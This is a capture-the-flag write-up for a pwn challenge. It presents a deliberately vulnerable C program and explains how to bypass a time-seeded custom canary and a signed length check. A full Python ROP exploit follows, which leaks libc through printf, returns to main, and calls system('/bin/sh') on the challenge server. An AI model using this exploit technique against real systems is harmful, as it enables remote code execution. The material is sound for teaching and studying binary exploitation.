## [Pwn] Kanai's Cube (250)

**kanais_cube.cpp**
```c
// Mitigation : ASLR, NX
// compile : gcc -fno-stack-protector -mpreferred-stack-boundary=2 -o Kanais_Cube Kanais_Cube.c -m32

#include <stdio.h>
#include <string.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

int gl_canary = 0;

int main(int argc, char *argv[])
{
	setvbuf(stdout, 0, 2, 0);
	srand(time(NULL));
	int canary;
	canary = rand();
	gl_canary = canary;
	unsigned short num = 0;
	char vuln[120];
	puts("Input the number of string you want to write!");
	scanf("%hd", &num);
	if((signed short)num > 120) {
		puts("Toooooooo Long!");
		exit(0);
	}
	printf("Input your string! max length : %d\n", (signed short)num);
	fflush(NULL);
	read(0, vuln, (unsigned)num);
	if(canary != gl_canary) {
		puts("[*] Do not Hack me :(");
		exit(0);
	}
	puts(vuln);
	return 0;
}
```

Simple ROP Challenge.  
It use Custom Canary made up of random integer using **time(NULL)** to protect BOF.  
It also check the length if the **length** excessed 120 before input.  

We can bypass the custom canary by setting arguments of **srand** same as challenge's.  
Next, we can also bypass the length check because **scanf** is using "%hd".  
"%hd" is a 2-byte **signed** integer type formatstring.  
So we can simply bypass it by inputting **"-1"**.  

After then, it's just simple ROP Challenge.  
But you can only leak the library in the first attempt, so you should call the **main** function again, and then exploit.

Exploit code is as follows.
```python
from hackutil import *
import ctypes
import struct
from time import *
from socket import *
from telnetlib import *

printf_plt = 0x08048440
read_got = 0x0804A00C
offset_read_system = 0x9e8b0
offset_read_binsh = 0xf7ee9bf0 - 0xf7f6f803
main = 0x080485DD

#============================

HOST = '45.32.38.83'
PORT = 25552

#============================

libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') # Linux env
libc.srand(libc.time(0))

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((HOST, PORT))

print sock.recv(1024)
sock.send('-1\n')

print sock.recv(1024)

canary = libc.rand()
print "[*] Canary : "+str(hex(canary))

sock.send('A'*124+p32(canary)+"BBBB"+p32(printf_plt)+p32(main)+p32(read_got))

sock.recv(1024)
data = sock.recv(1024)
print hexdump(data)

read_lib = up32(data[:4])[0]
system_lib = read_lib - offset_read_system
binsh_lib = read_lib - offset_read_binsh

print "[*] Find read_lib : " + str(hex(read_lib))
print "[*] Find system_lib : " + str(hex(system_lib))
print "[*] Find /bin/sh : " + str(hex(binsh_lib))

####################[ STEP 2 ]###################

libc.srand(libc.time(0))

sock.send('-1\n')

print sock.recv(1024)

canary = libc.rand()
print "[*] Canary : "+str(hex(canary))

sock.send('A'*122+p32(canary)+"B"*12+p32(system_lib)+"AAAA"+p32(binsh_lib))

t = Telnet()
t.sock = sock
t.interact()
```
